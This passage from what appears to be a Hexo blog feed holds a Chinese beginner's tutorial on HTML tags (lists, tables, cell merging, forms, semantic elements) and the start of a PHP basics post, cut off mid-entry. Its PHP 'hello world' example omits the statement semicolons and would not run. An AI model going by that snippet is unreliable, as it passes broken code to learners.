title="标题标签的位置摆放："></a>标题标签的位置摆放：</h3><p>在标签中添加属性<code>align=&quot;left|center|right&quot;</code>来改变位置。默认居左：</p><p><img src="https://pic1.imgdb.cn/item/67c962cd066befcec6df0049.png" alt=""></p><h2 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h2><h3 id="段落："><a href="#段落：" class="headerlink" title="段落："></a>段落：</h3><p>段落通过<code>&lt;p&gt;</code>标签来定义。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是另一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="换行："><a href="#换行：" class="headerlink" title="换行："></a>换行：</h3><p>如果在不产生一个新段落的情况下进行换行，使用<code>&lt;br&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>hhhh<span class="tag">&lt;<span class="name">br</span>&gt;</span>aaaa<span class="tag">&lt;<span class="name">br</span>&gt;</span>hhhh<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c963e1066befcec6df0335.png" alt=""></p><h3 id="水平线："><a href="#水平线：" class="headerlink" title="水平线："></a>水平线：</h3><p><code>&lt;hr&gt;</code>标签在HTML页面中创建水平线</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">size</span>=<span class="string">&quot;&quot;</span> <span class="attr">align</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>属性：</p><p>color：设置水平线颜色</p><p>width：设置水平线长度</p><p>size：设置水平线高度</p><p>align：设置水平线对齐方式（默认居中），可取值（left|right）</p><p><img src="https://pic1.imgdb.cn/item/67c96514066befcec6df05a4.png" alt=""></p><h2 id="图片标签："><a href="#图片标签：" class="headerlink" title="图片标签："></a>图片标签：</h2><p><code>&lt;img&gt;</code>标签定义HTML页面中的图像</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;&quot;</span> <span class="attr">height</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：<code>&lt;img&gt;</code> 是单标签，不需要进行闭合操作。</p><p>属性：</p><p>src：路径（图片地址与名字）</p><p>alt：规定图像的替代文本</p><p>width：规定图像的宽度</p><p>height：规定图像的高度</p><p>title：鼠标悬停在图片上给予提示</p><h2 id="超文本链接标签："><a href="#超文本链接标签：" class="headerlink" title="超文本链接标签："></a>超文本链接标签：</h2><p>HTML使用标签<code>&lt;a&gt;</code>来设置超文本链接</p><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，点击这些内容来跳转到新的文档或者当前文档中的某个部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c96c62066befcec6df11a3.png" alt=""></p><h3 id="超链接属性："><a href="#超链接属性：" class="headerlink" title="超链接属性："></a>超链接属性：</h3><p>默认情况下，链接将以以下形式出现在浏览器中：</p><ol><li>一个未访问过的链接显示为蓝色字体并带有下划线</li><li>访问过的链接显示为紫色并带有下划线</li><li>点击链接时，链接显示为红色并带有下划线。</li></ol><h2 id="文本标签："><a href="#文本标签：" class="headerlink" title="文本标签："></a>文本标签：</h2><h3 id="常用文本标签："><a href="#常用文本标签：" class="headerlink" title="常用文本标签："></a>常用文本标签：</h3><div class="table-container"><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;em&gt;</code></td><td style="text-align:center">定义着重文字</td></tr><tr><td style="text-align:center"><code>&lt;b&gt;</code></td><td style="text-align:center">定义粗体文字</td></tr><tr><td style="text-align:center"><code>&lt;i&gt;</code></td><td style="text-align:center">定义斜体字</td></tr><tr><td style="text-align:center"><code>&lt;strong&gt;</code></td><td style="text-align:center">定义加重语气</td></tr><tr><td style="text-align:center"><code>&lt;del&gt;</code></td><td style="text-align:center">定义删除字</td></tr><tr><td style="text-align:center"><code>&lt;span&gt;</code></td><td style="text-align:center">元素没有特定的含义</td></tr></tbody></table></div><p><strong>提示：</strong>常用文本标签和段落是不同的，段落表示一段文本，而文本标签一般表示文本词汇</p><p><img src="https://pic1.imgdb.cn/item/67c96dc7066befcec6df1495.png" alt=""></p><h2 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h2><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>有序列表是一列项目，列表项目使用数字进行标记。有序列表始于<code>&lt;ol&gt;</code>标签。每个列表项始于<code>&lt;li&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>冰冰<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>邦邦<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c96f9e066befcec6df159a.png" alt=""></p><p><code>&lt;ol&gt;</code> 的属性type拥有的选项：</p><p>1：表示列表项目用数字标号（1，2，3…）</p><p>a：表示列表项目用小写字母标号（a，b，c…）</p><p>A：表示列表项目用大写字母标号（A，B，C…）</p><p>i：表示列表项目用小写罗马字母标号（i，ii，iii…）</p><p>I：表示列表项目用大写罗马字母标号（I，II，III…）</p><p><img src="https://pic1.imgdb.cn/item/67cec783066befcec6e2749a.png" alt=""></p><h3 id="有序列表嵌套"><a href="#有序列表嵌套" class="headerlink" title="有序列表嵌套"></a>有序列表嵌套</h3><p>列表可以进行嵌套：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>冰冰邦邦1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>papa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>yyyyyy<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67cec82e066befcec6e274c2.png" alt=""></p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表是一个项目的列表，此列表使用粗体圆点进行标记</p><p>无序列表始于<code>&lt;ul&gt;</code>标签，每个列表项始于<code>&lt;li&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>hhh<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67ceca19066befcec6e2753a.png" alt=""></p><p><code>&lt;ul&gt;</code>的属性type拥有的选项：</p><p>disc 默认实心圆</p><p>circle 空心圆</p><p>square 小方块</p><p>none 不显示</p><h3 id="无序列表嵌套"><a href="#无序列表嵌套" class="headerlink" title="无序列表嵌套"></a>无序列表嵌套</h3><p>无序列表也可以进行嵌套：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>cccc<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>dddd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67cecb48066befcec6e27585.png" alt=""></p><p>快捷键：</p><p>快速生成ul+li的布局： ul&gt;li*3</p><h2 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h2><p>表格：<code>&lt;table&gt;</code></p><p>行：<code>&lt;tr&gt;</code></p><p>单元格（列）：<code>&lt;td&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>ddd<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>快捷键：</p><p>快速生成表格结构： table&gt;tr*2&gt;td{单元格}</p><p><strong>表格属性：</strong></p><p>border：设置表格边框</p><p>width：设置表格宽度</p><p>height：设置表格高度</p><p><img src="https://pic1.imgdb.cn/item/67cecf88066befcec6e27637.png" alt=""></p><h3 id="单元格合并"><a href="#单元格合并" class="headerlink" title="单元格合并"></a>单元格合并</h3><p><strong>水平合并：</strong>colspan</p><p><strong>垂直合并：</strong>rowspan</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>合并单元格6，7: colspan<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>合并单元格15，20: rowspan<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">P</span>&gt;</span>水平合并：保留左边，删除右边<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>垂直合并：保留上面，删除下面<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格5<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格6单元格7<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格8<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格9<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格11<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格12<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格13<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格14<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格15单元格20<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格16<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格17<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格18<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格19<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格21<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格22<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格23<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格24<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格25<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Form表单"><a href="#Form表单" class="headerlink" title="Form表单"></a>Form表单</h2><p>表单在Web网页中用来给用户填写信息，从而能够采集用户信息，使网页具有交互的功能</p><p>所有的用户输入内容的地方都用表单来写，如登录注册，搜索框</p><p>只要有用户输入的地方一定会有表单</p><p><strong>表单由容器和控件组成</strong>，一个表单一般应该包含用户填写的输入框，提交按钮等，这些输入框，按钮叫做控件，表单就是容器，它能够容纳各种各样的控件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;url&#x27;</span> <span class="attr">method</span>=<span class="string">&quot;get|post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;myform&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="属性说明："><a href="#属性说明：" class="headerlink" title="属性说明："></a>属性说明：</h3><p><code>action</code>：服务器地址</p><p><code>name</code>：表单名称</p><p><code>method</code>：数据提交方式</p><h3 id="表单元素："><a href="#表单元素：" class="headerlink" title="表单元素："></a>表单元素：</h3><p>一个完整的表单由三个基本部分组成：表单标签，表单域，表单按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d2f08e88c538a9b5bc8b98.png" alt=""></p><h4 id="文本框："><a href="#文本框：" class="headerlink" title="文本框："></a>文本框：</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code>标签来设定，当用户要在表单中键入字符数字等内容时，就会用到文本域</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="密码框："><a href="#密码框：" class="headerlink" title="密码框："></a>密码框：</h4><p>密码字段通过标签<code>&lt;input type=&quot;password&quot;&gt;</code>来定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>密码字段不会明文显示，而是星号或者圆点来代替。</p><p><img src="https://pic1.imgdb.cn/item/67d2f2b588c538a9b5bc8bfd.png" alt=""></p><h4 id="提交按钮："><a href="#提交按钮：" class="headerlink" title="提交按钮："></a>提交按钮：</h4><p>当用户单击确认按钮时，表单的内容会被传送到另一个文件，表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的数据进行相关的处理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d2f41a88c538a9b5bc8c64.png" alt=""></p><h2 id="块元素和行内元素（内联元素）"><a href="#块元素和行内元素（内联元素）" class="headerlink" title="块元素和行内元素（内联元素）"></a>块元素和行内元素（内联元素）</h2><p>内联元素和块元素的区别：</p><div class="table-container"><table><thead><tr><th style="text-align:center">块级元素</th><th style="text-align:center">内联元素</th></tr></thead><tbody><tr><td style="text-align:center">块元素会在页面独占一行（自上而下垂直排列）</td><td style="text-align:center">行内元素不会独占页面的一行，只占自身的大小</td></tr><tr><td style="text-align:center">可以设置width，height属性</td><td style="text-align:center">行内元素设置width，height属性无效</td></tr><tr><td style="text-align:center">一般块级元素可以包含行内元素和其他块级元素</td><td style="text-align:center">一般内联元素包含内联元素不包含块级元素</td></tr></tbody></table></div><p><strong>常见块级元素：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div,form,h1-h6,hr,p,table,ul等</span><br></pre></td></tr></table></figure><p><strong>常见内联元素：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a,b,em,i,span,strong等</span><br></pre></td></tr></table></figure><p><strong>行内块级元素（特点：不换行，能够识别宽高）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">button,img,input等</span><br></pre></td></tr></table></figure><h2 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h2><p><strong>div:</strong> 容器标签</p><p><strong>H5新标签：</strong></p><p><code>&lt;header&gt;&lt;/header&gt;</code>：头部</p><p><code>&lt;nav&gt;&lt;/nav&gt;</code>：导航</p><p><code>&lt;section&gt;&lt;/section&gt;</code>：定义文档中的节，比如章节，页眉，页脚</p><p><code>&lt;aside&gt;&lt;/aside&gt;</code>侧边栏</p><p><code>&lt;footer&gt;&lt;/footer&gt;</code>脚部</p><p><code>&lt;article&gt;&lt;/article&gt;</code>代表一个独立的，完整的相关内容块。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础语法</title>
      <link href="/2025/02/28/PHP%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/02/28/PHP%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础语法"><a href="#PHP基础语法" class="headerlink" title="PHP基础语法"></a>PHP基础语法</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><strong>PHP</strong>即“超文本预处理器”，是一种通用开源脚本语言。PHP是在服务器端执行的脚本语言，与C语言类似，是常用的网站开发语言。主要适用于Web开发领域。</p><p><strong>PHP是一门弱类型语言：</strong>不必向PHP声明该变量的数据类型，PHP会根据变量的值，自动把变量转为正确的数据类型</p><h4 id="基础语法："><a href="#基础语法：" class="headerlink" title="基础语法："></a>基础语法：</h4><hr><ol><li><p>PHP脚本可以放在文档中的任何位置。PHP脚本以<code>&lt;?PHP</code>开始，以<code>?&gt;</code>结束。</p></li><li><p>PHP文件的默认文件扩展名为.php</p></li><li><p>PHP文件通常包含HTML标签和一些PHP代码</p></li></ol><p><strong>输出hello world：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;hello,world&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="注释："><a href="#注释：" class="headerlink" 